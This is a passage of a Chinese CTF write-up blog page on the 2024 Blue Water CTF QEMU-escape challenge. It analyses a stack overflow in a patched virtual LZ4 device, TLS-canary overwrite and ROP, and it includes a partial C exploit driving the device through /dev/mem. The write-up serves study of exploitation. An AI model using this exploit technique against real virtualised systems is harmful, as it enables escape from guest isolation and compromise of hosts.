@@ -1,0 +1,878 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024 Blue Water CTF - The Great Escape（大逃逸） · Y0uYuGe</title>
+<meta name="description" content="本文首发于奇安信攻防社区。感觉以后真的应该专注一个方向，不然时间会被分得太散。比如这次一时兴起去看 WSL，结果发现完全不在自己的知识范围内，不过至少学会了怎么用 WSL :),">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20Blue%20Water%20CTF%20-%20The%20Great%20Escape%EF%BC%88%E5%A4%A7%E9%80%83%E9%80%B8%EF%BC%89" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024">2024 年</a></nav>
+    <h1>2024 Blue Water CTF - The Great Escape（大逃逸）</h1>
+    <div class="meta"><time>2024-10-27</time><span class="tag">#java</span><span class="tag">#Databases</span><span class="tag">#Servers</span><span class="tag">#CTF</span></div>
+    <article class="post-body">
+<p>本文首发于奇安信攻防社区： <a href="https://forum.butian.net/share/3852">https://forum.butian.net/share/3852</a></p>
+<blockquote>
+<p>感谢 XDLiu 师傅的帮助</p>
+</blockquote>
+<p>感觉以后真的应该专注一个方向，不然时间会被分得太散。比如这次一时兴起去看 WSL，结果发现完全不在自己的知识范围内，不过至少学会了怎么用 WSL :),</p>
+<h1 id="rootfscpiozst-与-rootfscpio">rootfs.cpio.zst 与 rootfs.cpio</h1>
+<p>要向 <code>rootfs.cpio.zst</code> 文件中添加文件，再重新压缩为 <code>rootfs.cpio.zst</code>，可以按以下步骤操作：</p>
+<ol>
+<li><p><strong>解压 <code>rootfs.cpio.zst</code></strong>：先解压 <code>.zst</code> 文件，再解包 <code>cpio</code> 文件以访问其中的内容。</p>
+</li>
+<li><p><strong>添加文件</strong>：将新文件添加到解出的文件系统中。</p>
+</li>
+<li><p><strong>重新打包为 <code>cpio</code> 文件</strong>：将修改后的文件系统重新打包为 <code>cpio</code> 文件。</p>
+</li>
+<li><p><strong>压缩为 <code>.zst</code> 文件</strong>：将新的 <code>cpio</code> 文件压缩为 <code>.zst</code>。</p>
+</li>
+</ol>
+<p>下面是在 Linux 系统上的详细步骤：</p>
+<h3 id="1-解压-rootfscpiozst">1. 解压 <code>rootfs.cpio.zst</code></h3>
+<p>首先，确保已经安装 <code>zstd</code> 和 <code>cpio</code> 工具。如果没有，可以通过包管理器安装，例如在 Ubuntu 上：</p>
+<pre><code class="language-bash">sudo apt update
+sudo apt install zstd cpio
+</code></pre>
+<p>解压 <code>.zst</code> 文件：</p>
+<pre><code class="language-bash">unzstd rootfs.cpio.zst
+</code></pre>
+<p>这条命令会生成一个 <code>rootfs.cpio</code> 文件。</p>
+<h3 id="2-解包-cpio-文件">2. 解包 <code>cpio</code> 文件</h3>
+<p>创建一个目录来存放解出的文件系统：</p>
+<pre><code class="language-bash">mkdir rootfs
+cd rootfs
+</code></pre>
+<p>解包 <code>cpio</code> 文件：</p>
+<pre><code class="language-bash">cpio -idmv &lt; ../rootfs.cpio
+</code></pre>
+<h3 id="3-添加文件">3. 添加文件</h3>
+<p>将要添加的文件复制到 <code>rootfs</code> 目录中。例如，假设有一个名为 <code>newfile.txt</code> 的文件：</p>
+<pre><code class="language-bash">cp /path/to/newfile.txt .
+</code></pre>
+<h3 id="4-重新打包为-cpio-文件">4. 重新打包为 <code>cpio</code> 文件</h3>
+<p>创建一个新的 <code>cpio</code> 文件，将 <code>rootfs</code> 目录打包到其中：</p>
+<pre><code class="language-bash">find . | cpio -o -H newc &gt; ../new_rootfs.cpio
+</code></pre>
+<h3 id="5-压缩为-zst-文件">5. 压缩为 <code>.zst</code> 文件</h3>
+<p>将新的 <code>cpio</code> 文件重新压缩为 <code>.zst</code> 格式：</p>
+<pre><code class="language-bash">zstd -o rootfs.cpio.zst ../new_rootfs.cpio
+</code></pre>
+<h3 id="清理临时文件">清理临时文件</h3>
+<p>可以删除临时文件和目录来释放空间：</p>
+<pre><code class="language-bash">rm ../new_rootfs.cpio
+cd ..
+rm -rf rootfs
+</code></pre>
+<h1 id="sudo-问题的解决">sudo 问题的解决</h1>
+<p>XDLiu 师傅解决了，太强了！！！</p>
+<blockquote>
+<p>busybox 原本的权限是 rws，其中 s 表示执行文件时会使用文件所有者的权限，而不是当前用户的权限。由于我们用普通用户解压，文件所有者变成了普通用户，因此即使用 root 执行该文件，它仍然以普通用户的权限运行。这也是使用 sudo 解压就没问题的原因：文件所有者始终是 root。</p>
+</blockquote>
+<h1 id="lz4">Lz4</h1>
+<p><a href="https://blog.csdn.net/weixin_45412350/article/details/123336868">https://blog.csdn.net/weixin_45412350/article/details/123336868</a>
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20Blue%20Water%20CTF%20-%20The%20Great%20Escape%EF%BC%88%E5%A4%A7%E9%80%83%E9%80%B8%EF%BC%89/assets/csdn-143062595/image-001-4cacfddc20.png" alt="图片">
+直接通过给出的源码链接查看解压过程</p>
+<pre><code class="language-c">LZ4 is a more efficient compression algorithm, it&#39;s one of the many derivates of LZ77, and it is known for it speed in decompression, that makes it a first choice for realtime compression of filesystems, it is used by ZFS for example. (https://en.wikipedia.org/wiki/LZ4_(compression_algorithm))
+
+In term of compression efficiency, it is a bit less efficient than zlib deflate algorithm, but in maximum compression mode (-hc mode) it&#39;s not far from zlib compression ratio.
+
+Here is a decompression stub in x86_64 assembly, it&#39;s only 60 bytes, and can be called from a C program too:
+       .globl lz4dec
+       .intel_syntax noprefix
+// lz4dec(const void *dst, void *src, void *srcend);
+// rdi = dst, destination buffer
+// rsi = src, compressed data
+// rdx points to end of compressed data
+lz4dec:
+.l0:    xor ecx,ecx
+        xor eax,eax
+        lodsb
+        movzx   ebx,al
+.cpy:   shr al,4
+        call buildfullcount
+        rep movsb   rsi 指向的源地址开始，连续复制字节到 rdi 指向的目标地址，直到复制的字节数达到 rcx 指定的数量。
+        cmp rsi,rdx
+        jae exit
+.copymatches:
+        lodsw  rsi 寄存器指向的内存位置读取一个字（2 个字节），然后将其加载到 AX 寄存器中
+        xchg ebx,eax
+        and al,15
+        call buildfullcount
+.matchcopy:
+        push rsi
+        push rdi
+        pop rsi
+        sub rsi,rbx
+        add ecx,4
+        rep movsb
+        pop rsi
+        jmp .l0
+buildfullcount:
+        cmp al,15
+        xchg ecx,eax
+        jne exit   # &lt;15
+.buildloop:
+        lodsb
+        add ecx,eax
+        cmp al,255
+        je .buildloop
+exit:   ret
+
+
+#include &lt;stdint.h&gt;
+#include &lt;stddef.h&gt;
+
+void lz4dec(uint8_t* dst, const uint8_t* src, const uint8_t* srcend) {
+    while (src &lt; srcend)
+    {
+        uint32_t length = 0;
+        uint32_t offset = 0;
+        uint8_t token = *src++;
+
+        // Copy literals
+        length = token &gt;&gt; 4;  //len 
+        if (length == 15) {
+            uint8_t len;
+            do {
+                len = *src++;
+                length += len;
+            } while (len == 255 &amp;&amp; src &lt; srcend);
+        }
+
+        for (uint32_t i = 0; i &lt; length; ++i) {  //literal
+            *dst++ = *src++;
+            if (src &gt;= srcend) return;
+        }
+
+        if (src &gt;= srcend) break;   
+
+        // Copy matches
+        offset = *(uint16_t*)src;   //offset
+        src += 2;
+        length = token &amp; 0x0F;  //match length
+        if (length == 15) {
+            uint8_t len;
+            do {
+                len = *src++;
+                length += len;
+            } while (len == 255 &amp;&amp; src &lt; srcend);
+        }
+        length += 4;
+
+        const uint8_t* match = dst - offset;
+        for (uint32_t i = 0; i &lt; length; ++i) {
+            *dst++ = *match++;
+        }
+    }
+}
+</code></pre>
+<p>可以利用 <code>      const uint8_t* match = dst - offset;         for (uint32_t i = 0; i &lt; length; ++i) {             *dst++ = *match++;         }</code> 向 dst 越界写入，并且通过修改 offset，还能使其向低地址方向越界读取</p>
+<h1 id="逆向分析">逆向分析</h1>
+<pre><code class="language-c">/*
+ * Virtual LZ4 Device
+ *
+ * Copyright (c) 2017 Milo Kim &lt;woogyom.kim@gmail.com&gt;
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License
+ * as published by the Free Software Foundation; either version 2
+ * of the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
+ *
+ */
+
+#include &quot;qemu/osdep.h&quot;
+#include &quot;hw/irq.h&quot;
+#include &quot;hw/qdev-properties.h&quot;
+#include &quot;hw/sysbus.h&quot;
+#include &quot;hw/virtio/virtio.h&quot;
+#include &quot;migration/qemu-file-types.h&quot;
+#include &quot;qemu/host-utils.h&quot;
+#include &quot;qemu/module.h&quot;
+#include &quot;sysemu/kvm.h&quot;
+#include &quot;sysemu/replay.h&quot;
+#include &quot;hw/virtio/virtio-mmio.h&quot;
+#include &quot;qemu/error-report.h&quot;
+#include &quot;qemu/log.h&quot;
+#include &quot;trace.h&quot;
+#include &quot;hw/hw.h&quot;
+#include &quot;exec/memory.h&quot;
+#include &quot;exec/address-spaces.h&quot;
+#include &quot;qemu/bitops.h&quot;
+
+#define TYPE_VIRT_LZ4DEV          &quot;virt-lz4dev&quot;
+#define VIRT_lz4dev(obj)          OBJECT_CHECK(Virtlz4devState, (obj), TYPE_VIRT_LZ4DEV)
+
+/* Register map */
+#define LZ4DEV_OFFSET_ID 0x00
+#define LZ4DEV_OFFSET_LEN 0x08
+#define LZ4DEV_OFFSET_TRIGGER 0x10
+#define LZ4DEV_INBUF 0x20
+
+#define REG_ID                 0x0
+#define CHIP_ID                0xf001
+
+#define INT_ENABLED            BIT(0)
+#define INT_BUFFER_DEQ         BIT(1)
+
+typedef struct {
+    SysBusDevice parent_obj;
+    MemoryRegion iomem;
+    qemu_irq irq;
+    hwaddr dst;
+    hwaddr len;
+    char inbuf[4096];
+
+} Virtlz4devState;
+
+extern uint64_t lz4dec_x86_64(void *dst, void *src, void *srcend);
+uint64_t lz4_cmd_decompress(Virtlz4devState *s, char *dst);
+
+uint64_t lz4_cmd_decompress(Virtlz4devState *s, char *dst)
+{
+uint64_t res;
+
+	res = lz4dec_x86_64(dst, s-&gt;inbuf, s-&gt;inbuf+s-&gt;len);
+	memcpy(&amp;s-&gt;inbuf[0], dst, (res &gt; 4096) ? 4096 : res);
+	return res;
+}
+
+static uint64_t virt_lz4dev_read(void *opaque, hwaddr offset, unsigned size)
+{
+	Virtlz4devState *s = (Virtlz4devState *)opaque;
+	uint64_t data;
+
+        if ((offset&gt;=0x20) &amp;&amp; (((offset-0x20)+size)&lt;4096))
+        {
+		        data = 0;
+                memcpy(&amp;data, &amp;s-&gt;inbuf[offset-0x20], size);
+                return data;
+        }
+
+    switch (offset) {
+    case LZ4DEV_OFFSET_ID:
+        return 0xdeadbeef;
+    case LZ4DEV_OFFSET_LEN:
+        return s-&gt;len;
+    default:
+        break;
+    }
+    return 0;
+}
+
+static void virt_lz4dev_write(void *opaque, hwaddr offset, uint64_t value,
+                          unsigned size)
+{
+    Virtlz4devState *s = (Virtlz4devState *)opaque;
+    uint64_t data;
+    char outbuf[4096];
+
+	if ((offset&gt;=0x20) &amp;&amp; (((offset-0x20)+size)&lt;0x800))
+	{
+		data = value;
+		memcpy(&amp;s-&gt;inbuf[offset-0x20], &amp;data, size);
+		return;
+	}
+
+    switch (offset) {
+    case LZ4DEV_OFFSET_LEN:
+		if ((hwaddr)value &lt; 2048)
+			s-&gt;len = (hwaddr)value;
+        break;
+    case LZ4DEV_OFFSET_TRIGGER:
+		// return decompressed size in s-&gt;len
+		s-&gt;len = (hwaddr)lz4_cmd_decompress(s, outbuf);
+        break;
+    default:
+        break;
+    }
+}
+
+static const MemoryRegionOps virt_lz4dev_ops = {
+    .read = virt_lz4dev_read,
+    .write = virt_lz4dev_write,
+    .endianness = DEVICE_NATIVE_ENDIAN,
+};
+
+static void virt_lz4dev_realize(DeviceState *d, Error **errp)
+{
+    Virtlz4devState *s = VIRT_lz4dev(d);
+    SysBusDevice *sbd = SYS_BUS_DEVICE(d);
+
+    memory_region_init_io(&amp;s-&gt;iomem, OBJECT(s), &amp;virt_lz4dev_ops, s, TYPE_VIRT_LZ4DEV, 0x1000);
+    sysbus_init_mmio(sbd, &amp;s-&gt;iomem);
+    sysbus_init_irq(sbd, &amp;s-&gt;irq);
+}
+
+static void virt_lz4dev_class_init(ObjectClass *klass, void *data)
+{
+    DeviceClass *dc = DEVICE_CLASS(klass);
+
+    dc-&gt;realize = virt_lz4dev_realize;
+}
+
+static const TypeInfo virt_lz4dev_info = {
+    .name          = TYPE_VIRT_LZ4DEV,
+    .parent        = TYPE_SYS_BUS_DEVICE,
+    .instance_size = sizeof(Virtlz4devState),
+    .class_init    = virt_lz4dev_class_init,
+};
+
+static void virt_lz4dev_register_types(void)
+{
+    type_register_static(&amp;virt_lz4dev_info);
+}
+
+type_init(virt_lz4dev_register_types)
+
+</code></pre>
+<pre><code class="language-c">diff --color -aur qemu-8.2.0/hw/arm/virt.c qemu-8.2.0-patched/hw/arm/virt.c
+--- qemu-8.2.0/hw/arm/virt.c	2023-12-19 22:24:34.000000000 +0100
++++ qemu-8.2.0-patched/hw/arm/virt.c	2024-05-25 09:51:45.943761308 +0200
+@@ -157,6 +157,7 @@
+     [VIRT_PVTIME] =             { 0x090a0000, 0x00010000 },
+     [VIRT_SECURE_GPIO] =        { 0x090b0000, 0x00001000 },
+     [VIRT_MMIO] =               { 0x0a000000, 0x00000200 },
++    [VIRT_LZ4DEV] =             { 0x0b000000, 0x00000200 },
+     /* ...repeating for a total of NUM_VIRTIO_TRANSPORTS, each of that size */
+     [VIRT_PLATFORM_BUS] =       { 0x0c000000, 0x02000000 },
+     [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
+@@ -202,6 +203,7 @@
+     [VIRT_GIC_V2M] = 48, /* ...to 48 + NUM_GICV2M_SPIS - 1 */
+     [VIRT_SMMU] = 74,    /* ...to 74 + NUM_SMMU_IRQS - 1 */
+     [VIRT_PLATFORM_BUS] = 112, /* ...to 112 + PLATFORM_BUS_NUM_IRQS -1 */
++    [VIRT_LZ4DEV] = 112 + PLATFORM_BUS_NUM_IRQS,
+ };
+ 
+ static const char *valid_cpus[] = {
+@@ -1116,6 +1118,38 @@
+     }
+ }
+ 
++static void create_virt_lz4dev_device(const VirtMachineState *vms)
++{
++    MachineState *ms = MACHINE(vms);
++    hwaddr base = vms-&gt;memmap[VIRT_LZ4DEV].base;
++    hwaddr size = vms-&gt;memmap[VIRT_LZ4DEV].size;
++    int irq = vms-&gt;irqmap[VIRT_LZ4DEV];
++    char *nodename;
++
++    /*
++     * virt-lz4dev@0b000000 {
++     *         compatible = &quot;virt-lz4dev&quot;;
++     *         reg = &lt;0x0b000000 0x200&gt;;
++     *         interrupt-parent = &lt;&amp;gic&gt;;
++     *         interrupts = &lt;176&gt;;
++     * }
++     */
++
++    sysbus_create_simple(&quot;virt-lz4dev&quot;, base, qdev_get_gpio_in(vms-&gt;gic, irq));
++
++    nodename = g_strdup_printf(&quot;/virt_lz4dev@%&quot; PRIx64, base);
++    qemu_fdt_add_subnode(ms-&gt;fdt, nodename);
++    qemu_fdt_setprop_string(ms-&gt;fdt, nodename, &quot;compatible&quot;, &quot;virt-lz4dev&quot;);
++    qemu_fdt_setprop_sized_cells(ms-&gt;fdt, nodename, &quot;reg&quot;, 2, base, 2, size);
++    qemu_fdt_setprop_cells(ms-&gt;fdt, nodename, &quot;interrupt-parent&quot;,
++                           vms-&gt;gic_phandle);
++    qemu_fdt_setprop_cells(ms-&gt;fdt, nodename, &quot;interrupts&quot;,
++                           GIC_FDT_IRQ_TYPE_SPI, irq,
++                           GIC_FDT_IRQ_FLAGS_LEVEL_HI);
++
++    g_free(nodename);
++}
++
+ #define VIRT_FLASH_SECTOR_SIZE (256 * KiB)
+ 
+ static PFlashCFI01 *virt_flash_create1(VirtMachineState *vms,
+@@ -2308,6 +2342,7 @@
+      * no backend is created the transport will just sit harmlessly idle.
+      */
+     create_virtio_devices(vms);
++    create_virt_lz4dev_device(vms);
+ 
+     vms-&gt;fw_cfg = create_fw_cfg(vms, &amp;address_space_memory);
+     rom_set_fw(vms-&gt;fw_cfg);
+Seulement dans qemu-8.2.0-patched/hw/misc: lz4dec_x86_64.s
+diff --color -aur qemu-8.2.0/hw/misc/meson.build qemu-8.2.0-patched/hw/misc/meson.build
+--- qemu-8.2.0/hw/misc/meson.build	2023-12-19 22:24:34.000000000 +0100
++++ qemu-8.2.0-patched/hw/misc/meson.build	2023-12-31 03:52:01.645221730 +0100
+@@ -1,5 +1,7 @@
+ system_ss.add(when: &#39;CONFIG_APPLESMC&#39;, if_true: files(&#39;applesmc.c&#39;))
+ system_ss.add(when: &#39;CONFIG_EDU&#39;, if_true: files(&#39;edu.c&#39;))
++system_ss.add(files(&#39;virt_lz4dev.c&#39;))
++system_ss.add(files(&#39;lz4dec_x86_64.s&#39;))
+ system_ss.add(when: &#39;CONFIG_FW_CFG_DMA&#39;, if_true: files(&#39;vmcoreinfo.c&#39;))
+ system_ss.add(when: &#39;CONFIG_ISA_DEBUG&#39;, if_true: files(&#39;debugexit.c&#39;))
+ system_ss.add(when: &#39;CONFIG_ISA_TESTDEV&#39;, if_true: files(&#39;pc-testdev.c&#39;))
+Seulement dans qemu-8.2.0-patched/hw/misc: virt_lz4dev.c
+diff --color -aur qemu-8.2.0/include/hw/arm/virt.h qemu-8.2.0-patched/include/hw/arm/virt.h
+--- qemu-8.2.0/include/hw/arm/virt.h	2023-12-19 22:24:34.000000000 +0100
++++ qemu-8.2.0-patched/include/hw/arm/virt.h	2023-12-31 05:00:08.097627518 +0100
+@@ -76,6 +76,7 @@
+     VIRT_ACPI_GED,
+     VIRT_NVDIMM_ACPI,
+     VIRT_PVTIME,
++    VIRT_LZ4DEV,
+     VIRT_LOWMEMMAP_LAST,
+ };
+ 
+</code></pre>
+<pre><code class="language-c">	.globl lz4dec_x86_64
+	.intel_syntax noprefix
+//
+// https://github.com/nobodyisnobody/tools/tree/main/Assembly.Decompression.Stubs#2--lz4-compression
+// small lz4 decompression stub in x86_64 assembly (60 bytes)
+// lz4dec_x86_64(void *dst, void *src, void *srcend);
+lz4dec_x86_64:
+	push rcx
+	push rbx
+	push rdi
+.l0:
+	xor ecx,ecx
+	xor eax,eax
+	lodsb         从源指针（rsi）指向的内存位置加载一个字节到 al 寄存器
+	movzx	   ebx,al  将 al 中的 8 位无符号值扩展为 32 位，并存储在 ebx 中
+.cpy:
+	shr al,4
+	call buildfullcount
+	rep movsb
+	cmp rsi,rdx
+	jae .done2
+.copymatches:
+	lodsw
+	xchg ebx,eax
+	and al,15
+	call buildfullcount
+.matchcopy:
+	push rsi
+	push rdi
+	pop rsi
+	sub rsi,rbx
+	add ecx,4
+	rep movsb
+	pop rsi
+	jmp .l0
+
+buildfullcount:
+	cmp al,15
+	xchg ecx,eax
+	jne .done1
+.buildloop:
+	lodsb
+	add ecx,eax
+	cmp al,255
+	je .buildloop
+.done1:
+	ret
+.done2:
+	push rdi
+	pop rax
+	pop rdi
+	sub rax,rdi
+	pop rbx
+	pop rcx
+	ret
+
+#include &lt;stdint.h&gt;
+
+// lz4dec_x86_64(void *dst, void *src, void *srcend);
+void lz4dec_x86_64(uint8_t* dst, const uint8_t* src, const uint8_t* srcend) {
+    const uint8_t* original_dst = dst;
+
+    while (src &lt; srcend) {
+        uint32_t length = 0;
+        uint32_t offset = 0;
+        uint8_t token = *src++;
+
+        // Copy literals
+        length = token &gt;&gt; 4;
+        if (length == 15) {
+            uint8_t len;
+            do {
+                len = *src++;
+                length += len;
+            } while (len == 255 &amp;&amp; src &lt; srcend);
+        }
+        for (uint32_t i = 0; i &lt; length; ++i) {
+            *dst++ = *src++;
+            if (src &gt;= srcend) goto done2;
+        }
+
+        if (src &gt;= srcend) break;
+
+        // Copy matches
+        offset = *(uint16_t*)src;
+        src += 2;
+        length = (token &amp; 0x0F);
+        if (length == 15) {
+            uint8_t len;
+            do {
+                len = *src++;
+                length += len;
+            } while (len == 255 &amp;&amp; src &lt; srcend);
+        }
+        length += 4;
+
+        const uint8_t* match = dst - offset;
+        for (uint32_t i = 0; i &lt; length; ++i) {
+            *dst++ = *match++;
+        }
+    }
+
+done2: ;
+    // Calculate the decompressed length
+    size_t decompressed_length = dst - original_dst;
+}
+
+
+
+</code></pre>
+<h1 id="漏洞">漏洞</h1>
+<pre><code class="language-c">
+// lz4dec_x86_64(void *dst, void *src, void *srcend);
+void lz4dec_x86_64(uint8_t* dst, const uint8_t* src, const uint8_t* srcend) {
+    const uint8_t* original_dst = dst;
+
+    while (src &lt; srcend) {
+        uint32_t length = 0;
+        uint32_t offset = 0;
+        uint8_t token = *src++;
+
+        // Copy literals
+        length = token &gt;&gt; 4;
+        if (length == 15) {
+            uint8_t len;
+            do {
+                len = *src++;
+                length += len;
+            } while (len == 255 &amp;&amp; src &lt; srcend);
+        }
+        for (uint32_t i = 0; i &lt; length; ++i) {
+            *dst++ = *src++;
+            if (src &gt;= srcend) goto done2;
+        }
+
+        if (src &gt;= srcend) break;
+
+        // Copy matches
+        offset = *(uint16_t*)src;
+        src += 2;
+        length = (token &amp; 0x0F);
+        if (length == 15) {
+            uint8_t len;
+            do {
+                len = *src++;
+                length += len;
+            } while (len == 255 &amp;&amp; src &lt; srcend);
+        }
+        length += 4;
+
+        const uint8_t* match = dst - offset;
+        for (uint32_t i = 0; i &lt; length; ++i) {
+            *dst++ = *match++;
+        }
+    }
+
+done2: ;
+    // Calculate the decompressed length
+    size_t decompressed_length = dst - original_dst;
+}
+
+
+uint64_t lz4_cmd_decompress(Virtlz4devState *s, char *dst)
+{
+uint64_t res;
+
+	res = lz4dec_x86_64(dst, s-&gt;inbuf, s-&gt;inbuf+s-&gt;len);
+	memcpy(&amp;s-&gt;inbuf[0], dst, (res &gt; 4096) ? 4096 : res);
+	return res;
+}
+
+static void virt_lz4dev_write(void *opaque, hwaddr offset, uint64_t value,
+                          unsigned size)
+{
+    Virtlz4devState *s = (Virtlz4devState *)opaque;
+    uint64_t data;
+    char outbuf[4096];
+    
+ case LZ4DEV_OFFSET_TRIGGER:
+		// return decompressed size in s-&gt;len
+		s-&gt;len = (hwaddr)lz4_cmd_decompress(s, outbuf);
+        break;     
+ }
+</code></pre>
+<p>outbuf 位于栈上。lz4_cmd_decompress 将 s-&gt;inbuf 到 s-&gt;inbuf+s-&gt;len 范围内的数据解压到 outbuf，由于这里没有 4096 的长度限制，会在 virt_lz4dev_write 中造成栈溢出。</p>
+<h1 id="交互">交互</h1>
+<p>有 root 权限就可以打开 /dev/mem，再通过 mmap 把物理地址映射到用户空间。我真是傻了，还在想着内核模块，连内核头文件都没给，显然不可能是模块.jpg</p>
+<p>有个没什么用的溢出漏洞，放弃之后感觉问题在解压过程里。谁能想到一道 pwn 题还要去找解压算法，真是开了眼了，显然还是我太菜.jpg</p>
+<p>给了原始源码，呃……对比之后发现有改动……主要的问题是，传入的虽然是压缩数据，但这些压缩数据是我们自己构造的，而不是由它的压缩算法生成的。</p>
+<h1 id="思路">思路</h1>
+<p>利用 offset 向负方向越界读取来泄露数据，但最大只有 0xffff，没有找到可以泄露的 canary。发现仍然能利用的内容都在高地址</p>
+<pre><code class="language-bash">1a:00d0│         0x7f8eb4ffe0b0 —▸ 0x7f8eb4ffe0e0 ◂— 0
+1b:00d8│         0x7f8eb4ffe0b8 —▸ 0x7f8eb4ffe1fe ◂— 0
+1c:00e0│         0x7f8eb4ffe0c0 —▸ 0x7f8eb4ffe0e0 ◂— 0
+1d:00e8│         0x7f8eb4ffe0c8 —▸ 0x5e4569b7c3c0 —▸ 0x5e45691ecd50 —▸ 0x5e4568fdef80 —▸ 0x5e4568fdf100 ◂— ...
+1e:00f0│         0x7f8eb4ffe0d0 ◂— 4
+1f:00f8│ rsp     0x7f8eb4ffe0d8 —▸ 0x5e4566b27879 (lz4_cmd_decompress+73) ◂— mov ecx, 0x1000
+20:0100│ rdi r12 0x7f8eb4ffe0e0 ◂— 0    // 是dst  -offset可以泄露上面内容
+</code></pre>
+<p>所以只能覆盖 TLS 中的 canary</p>
+<p>然后进行 ROP</p>
+<h1 id="tls-canary">TLS canary:</h1>
+<p><a href="https://www.cnblogs.com/CH13hh/p/18299195">https://www.cnblogs.com/CH13hh/p/18299195</a></p>
+<p>每个线程都有一个 TCB 和各自的 TLS（线程局部存储）区域，其中存放着独立的 canary</p>
+<p>每个 TCB 都指向 TLS 区域，而 TCB 存放在高地址</p>
+<ul>
+<li>能溢出大量字节，至少 1 页</li>
+<li>能够创建线程，并且线程内部存在栈溢出</li>
+</ul>
+<pre><code class="language-c">struct pthread {
+#if !TLS_DTV_AT_TP
+    /* This overlaps the TCB as used for TLS without threads (see tls.h).  */
+    tcbhead_t header; // 可能与TLS相关的头部信息
+#else
+    struct {
+        // 更复杂的结构体定义
+        // 可能包含与TLS相关的更多详细信息
+        // ...
+    } header;
+#endif
+​
+    /* Extra padding for alignment and potential future use */
+    void *__padding[24]; // 填充数组，用于对齐和可能的未来扩展
+};
+
+typedef struct {
+    void *tcb;            /* 指向线程控制块（TCB）的指针 */
+    dtv_t *dtv;           /* 线程特定数据的指针 */
+    void *self;           /* 指向线程描述符的指针 */
+    int multiple_threads; /* 标识是否有多个线程 */
+    int gscope_flag;      /* 全局作用域标志 */
+    uintptr_t sysinfo;    /* 系统信息 */
+    uintptr_t stack_guard;/* 堆栈保护 */
+    uintptr_t pointer_guard; /* 指针保护 */
+​
+    /* 其他可能的字段... */
+} tcbhead_t;
+</code></pre>
+<p>注意：覆盖 fs 段时，尽量让 canary 之前的部分保持不变，或保持相同类型，否则会遇到下面的问题</p>
+<pre><code class="language-bash">► 0x784be8ca38a0 &lt;pthread_setcancelstate&gt;       endbr64 
+   0x784be8ca38a4 &lt;pthread_setcancelstate+4&gt;     cmp    edi, 1     1 - 1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ]
+   0x784be8ca38a7 &lt;pthread_setcancelstate+7&gt;     ja     pthread_setcancelstate+80   &lt;pthread_setcancelstate+80&gt;
+ 
+   0x784be8ca38a9 &lt;pthread_setcancelstate+9&gt;     mov    rax, qword ptr fs:[0x10]         RAX, [0x784bb54006d0] =&gt; 0x101010101010101
+   0x784be8ca38b2 &lt;pthread_setcancelstate+18&gt;    lea    rcx, [rax + 0x308]               RCX =&gt; 0x101010101010409
+   0x784be8ca38b9 &lt;pthread_setcancelstate+25&gt;    mov    eax, dword ptr [rax + 0x308]     &lt;Cannot dereference [0x101010101010409]&gt;
+
+</code></pre>
+<h1 id="利用脚本">利用脚本</h1>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;stdint.h&gt;
+
+#define VIRT_LZ4DEV_BASE 0x0b000000
+#define VIRT_LZ4DEV_SIZE 0x00000200
+
+#define LZ4DEV_OFFSET_ID 0x00
+#define LZ4DEV_OFFSET_LEN 0x08
+#define LZ4DEV_OFFSET_TRIGGER 0x10
+#define LZ4DEV_INBUF 0x20
+
+void compress(char low,char high,int literal_len,char*literal,short offset,int match_len)
+{
+}
+int main() {
+    int fd;
+    void *map_base;
+    volatile uint64_t *id_reg;
+    volatile uint64_t *len_reg;
+    volatile uint64_t *trigger_reg;
+    volatile uint8_t *inbuf;
+    uint64_t token;
+    uint64_t literal_len;
+    uint64_t literal;
+    uint64_t offset;
+    uint64_t match_len;
+    uint64_t   compress;
+    // Open /dev/mem
+    fd = open(&quot;/dev/mem&quot;, O_RDWR | O_SYNC);
+    if (fd == -1) {
+        perror(&quot;open /dev/mem&quot;);
+        exit(1);
+    }
+
+    // Map the device memory
+    map_base = mmap(NULL, VIRT_LZ4DEV_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, VIRT_LZ4DEV_BASE);
+    if (map_base == MAP_FAILED) {
+        perror(&quot;mmap&quot;);
+        close(fd);
+        exit(1);
+    }
+
+    // Get pointers to the registers
+    id_reg = (volatile uint64_t *)(map_base + LZ4DEV_OFFSET_ID);
+    len_reg = (volatile uint64_t *)(map_base + LZ4DEV_OFFSET_LEN);
+    trigger_reg = (volatile uint64_t *)(map_base + LZ4DEV_OFFSET_TRIGGER);
+    inbuf = (volatile uint8_t *)(map_base + LZ4DEV_INBUF);
+
+    // leak 
+    token=0xf;
+    offset=0x20&lt;&lt;8;
+    match_len=0x20&lt;&lt;24;
+
+    compress=token|offset|match_len;
+    // Write some data to the input buffer
+    *(uint32_t*)inbuf=compress;
+    *len_reg=8;
+    // Trigger the decompression
+    *trigger_reg = 1;
+    
+    
+    uint64_t lowerpie =*(uint32_t*)(inbuf+24);  //0xc01f20  0x7cee0a000000
+    printf(&quot;lower pie %llx \n&quot;,lowerpie);
+    uint64_t higherpie =*(uint32_t*)(inbuf+28);
